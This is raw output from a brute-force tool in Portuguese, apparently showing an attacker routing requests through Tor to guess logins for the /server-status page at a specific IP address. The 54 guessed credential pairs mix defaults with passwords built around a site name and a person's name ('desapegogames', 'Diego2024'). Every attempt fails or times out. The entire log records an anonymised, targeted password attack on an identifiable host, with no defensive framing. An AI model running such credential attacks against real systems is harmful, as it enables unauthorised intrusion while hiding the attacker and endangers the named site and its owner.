[*] /server-status brute — 54 pares via Tor
  'admin'                  :'admin'                   → HTTP 401 len=421 fail(401)
  'admin'                  :'password'                → HTTP 401 len=421 fail(401)
  'admin'                  :'admin123'                → HTTP 401 len=421 fail(401)
  'admin'                  :'123456'                  → HTTP 401 len=421 fail(401)
  'admin'                  :'apache'                  → HTTP 401 len=421 fail(401)
  'admin'                  :'desapegogames'           → HTTP 401 len=421 fail(401)
  'admin'                  :'desapego'                → HTTP 401 len=421 fail(401)
  'admin'                  :'trindade'                → HTTP 401 len=421 fail(401)
  'admin'                  :'password123'             → HTTP 401 len=421 fail(401)
  'admin'                  :'admin1234'               → HTTP 401 len=421 fail(401)
  'admin'                  :'qwerty'                  → HTTP 401 len=421 fail(401)
  'admin'                  :'pass'                    → HTTP 401 len=421 fail(401)
  'admin'                  :'Password1'               → HTTP 401 len=421 fail(401)
  'admin'                  :'P@ssw0rd'                → HTTP 401 len=421 fail(401)
  'admin'                  :'changeme'                → HTTP 401 len=421 fail(401)
  'admin'                  :'welcome'                 → HTTP 401 len=421 fail(401)
  'admin'                  :'welcome1'                → HTTP 401 len=421 fail(401)
  'admin'                  :'master'                  → HTTP 401 len=421 fail(401)
  'admin'                  :'desapego2024'            → HTTP 401 len=421 fail(401)
  'admin'                  :'Diego2024'               → HTTP 401 len=421 fail(401)
  'admin'                  :'diego'                   → HTTP 401 len=421 fail(401)
  'admin'                  :'12345678'                → HTTP 401 len=421 fail(401)
  'admin'                  :'letmein'                 → HTTP 401 len=421 fail(401)
  'admin'                  :'secret'                  → HTTP 401 len=421 fail(401)
  'apache'                 :'apache'                  → HTTP 401 len=421 fail(401)
  'apache'                 :'password'                → HTTP 401 len=421 fail(401)
  'apache'                 :'admin'                   → HTTP 401 len=421 fail(401)
  'apache'                 :'apache123'               → HTTP 401 len=421 fail(401)
  'apache'                 :'123456'                  → HTTP 401 len=421 fail(401)
  'root'                   :'root'                    → HTTP 401 len=421 fail(401)
  'root'                   :'toor'                    → HTTP 401 len=421 fail(401)
  'root'                   :'password'                → HTTP 401 len=421 fail(401)
  'root'                   :'desapegogames'           → HTTP 401 len=421 fail(401)
  'root'                   :'admin'                   → HTTP 401 len=421 fail(401)
  'root'                   :'123456'                  → HTTP 401 len=421 fail(401)
  'desapegogames'          :'desapegogames'           → HTTP 401 len=421 fail(401)
  'desapegogames'          :'desapego'                → HTTP 401 len=421 fail(401)
  'desapegogames'          :'admin'                   → HTTP 401 len=421 fail(401)
  'desapegogames'          :'password'                → HTTP 401 len=421 fail(401)
  'desapegogames'          :'Desapego@2024'           → EXC ConnectTimeout: SOCKSHTTPSConnectionPool(host='186.226.60.54', port=443): Max retries exceeded with url: /server-status (Caused by ConnectTimeoutError(<urllib3.contrib.socks.SOCKSHTTPSConnection object at 0x7a75fe84c9b0>, 'Connection to 186.226.60.54 timed out. (connect timeout=20)'))
  'desapego'               :'desapego'                → HTTP 401 len=421 fail(401)
  'desapego'               :'admin'                   → HTTP 401 len=421 fail(401)
  'desapego'               :'password'                → EXC ConnectTimeout: SOCKSHTTPSConnectionPool(host='186.226.60.54', port=443): Max retries exceeded with url: /server-status (Caused by ConnectTimeoutError(<urllib3.contrib.socks.SOCKSHTTPSConnection object at 0x7a75fe84d910>, 'Connection to 186.226.60.54 timed out. (connect timeout=20)'))
  'trindade'               :'trindade'                → HTTP 401 len=421 fail(401)
  'trindade'               :'desapego'                → HTTP 401 len=421 fail(401)
  'trindade'               :'password'                → HTTP 401 len=421 fail(401)
  'diego'                  :'diego'                   → HTTP 401 len=421 fail(401)
  'diego'                  :'desapego'                → EXC ConnectTimeout: SOCKSHTTPSConnectionPool(host='186.226.60.54', port=443): Max retries exceeded with url: /server-status (Caused by ConnectTimeoutError(<urllib3.contrib.socks.SOCKSHTTPSConnection object at 0x7a75fe84df40>, 'Connection to 186.226.60.54 timed out. (connect timeout=20)'))
  'diego'                  :'Diego@2024'              → HTTP 401 len=421 fail(401)
  'server'                 :'server'                  → HTTP 401 len=421 fail(401)
  'server'                 :'status'                  → HTTP 401 len=421 fail(401)
  'status'                 :'status'                  → HTTP 401 len=421 fail(401)
  'administrator'          :'administrator'           → HTTP 401 len=421 fail(401)
  'administrator'          :'password'                → HTTP 401 len=421 fail(401)
[-] Nenhuma cred funcionou.
